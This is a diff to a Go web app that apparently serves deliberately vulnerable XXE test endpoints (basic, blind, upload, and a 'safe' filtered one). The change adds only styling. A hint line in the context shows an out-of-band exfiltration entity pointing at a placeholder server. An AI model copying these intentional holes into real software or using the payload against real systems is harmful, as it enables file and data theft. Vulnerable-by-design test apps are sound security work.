@@ -39,8 +39,11 @@ func basic(w http.ResponseWriter, r *http.Request) {
 
 		fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>XXE - Basic</title></head>
+<head><title>XXE - Basic</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>XML External Entity - Basic</h1>
 <form method="POST">
     <textarea name="xml" rows="10" cols="60">%s</textarea><br>
@@ -62,6 +65,7 @@ func basic(w http.ResponseWriter, r *http.Request) {
 
 		fmt.Fprintf(w, `</pre>
 <p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
+</div>
 </body></html>`)
 		return
 	}
@@ -77,8 +81,11 @@ func basic(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>XXE - Basic</title></head>
+<head><title>XXE - Basic</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>XML External Entity - Basic</h1>
 <form method="POST">
     <textarea name="xml" rows="10" cols="60">%s</textarea><br>
@@ -87,6 +94,7 @@ func basic(w http.ResponseWriter, r *http.Request) {
 <h3>Hint:</h3>
 <p><small>Try the default payload with external entity reference</small></p>
 <p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
+</div>
 </body></html>`, strings.ReplaceAll(defaultXML, "<", "&lt;"))
 }
 
@@ -102,12 +110,16 @@ func blind(w http.ResponseWriter, r *http.Request) {
 
 		fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>XXE - Blind</title></head>
+<head><title>XXE - Blind</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>XML External Entity - Blind</h1>
 <p>XML processed successfully.</p>
 <p><a href="/vulns/injection/xxe/blind">Try again</a></p>
 <p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
+</div>
 </body></html>`)
 		return
 	}
@@ -123,8 +135,11 @@ func blind(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>XXE - Blind</title></head>
+<head><title>XXE - Blind</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>XML External Entity - Blind</h1>
 <p>This endpoint parses XML but doesn't show the result (blind XXE).</p>
 <form method="POST">
@@ -134,6 +149,7 @@ func blind(w http.ResponseWriter, r *http.Request) {
 <h3>Hint:</h3>
 <p><small>Use out-of-band exfiltration: &lt;!ENTITY xxe SYSTEM "http://your-server/?data=..."&gt;</small></p>
 <p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
+</div>
 </body></html>`, strings.ReplaceAll(defaultXML, "<", "&lt;"))
 }
 
@@ -144,10 +160,16 @@ func upload(w http.ResponseWriter, r *http.Request) {
 		file, _, err := r.FormFile("xmlfile")
 		if err != nil {
 			fmt.Fprintf(w, `<!DOCTYPE html>
-<html><body>
+<html>
+<head>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
+<body>
+<div class="container">
 <h1>Error</h1>
 <p>%s</p>
 <p><a href="/vulns/injection/xxe/upload">Try again</a></p>
+</div>
 </body></html>`, err.Error())
 			return
 		}
@@ -157,8 +179,11 @@ func upload(w http.ResponseWriter, r *http.Request) {
 
 		fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>XXE - Upload</title></head>
+<head><title>XXE - Upload</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>XML External Entity - File Upload</h1>
 <h2>Parsed Result:</h2>
 <pre>`)
@@ -175,14 +200,18 @@ func upload(w http.ResponseWriter, r *http.Request) {
 		fmt.Fprintf(w, `</pre>
 <p><a href="/vulns/injection/xxe/upload">Upload another</a></p>
 <p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
+</div>
 </body></html>`)
 		return
 	}
 
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>XXE - Upload</title></head>
+<head><title>XXE - Upload</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>XML External Entity - File Upload</h1>
 <form method="POST" enctype="multipart/form-data">
     <input type="file" name="xmlfile" accept=".xml"><br><br>
@@ -191,6 +220,7 @@ func upload(w http.ResponseWriter, r *http.Request) {
 <h3>Hint:</h3>
 <p><small>Upload an XML file with external entity references</small></p>
 <p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
+</div>
 </body></html>`)
 }
 
@@ -205,21 +235,28 @@ func fpDisabled(w http.ResponseWriter, r *http.Request) {
 		if strings.Contains(xmlData, "<!DOCTYPE") || strings.Contains(xmlData, "<!ENTITY") {
 			fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>XXE - Safe</title></head>
+<head><title>XXE - Safe</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>XML External Entity - Safe</h1>
 <h2>Error:</h2>
 <pre>DTD and external entities are not allowed</pre>
 <p><a href="/vulns/injection/xxe/fp/disabled">Try again</a></p>
 <p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
+</div>
 </body></html>`)
 			return
 		}
 
 		fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>XXE - Safe</title></head>
+<head><title>XXE - Safe</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>XML External Entity - Safe</h1>
 <h2>Parsed Result:</h2>
 <pre>`)
@@ -236,6 +273,7 @@ func fpDisabled(w http.ResponseWriter, r *http.Request) {
 		fmt.Fprintf(w, `</pre>
 <p><a href="/vulns/injection/xxe/fp/disabled">Try again</a></p>
 <p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
+</div>
 </body></html>`)
 		return
 	}
@@ -248,8 +286,11 @@ func fpDisabled(w http.ResponseWriter, r *http.Request) {
 
 	fmt.Fprintf(w, `<!DOCTYPE html>
 <html>
-<head><title>XXE - Safe</title></head>
+<head><title>XXE - Safe</title>
+<link rel="stylesheet" href="/static/css/hive.css">
+</head>
 <body>
+<div class="container">
 <h1>XML External Entity - Safe</h1>
 <p>This endpoint rejects DTD declarations and external entities.</p>
 <form method="POST">
@@ -259,5 +300,6 @@ func fpDisabled(w http.ResponseWriter, r *http.Request) {
 <h3>Filter:</h3>
 <p><small>SAFE: DTD and external entity declarations are rejected</small></p>
 <p><a href="/vulns/injection/xxe/">Back to XXE Tests</a></p>
+</div>
 </body></html>`, strings.ReplaceAll(defaultXML, "<", "&lt;"))
 }
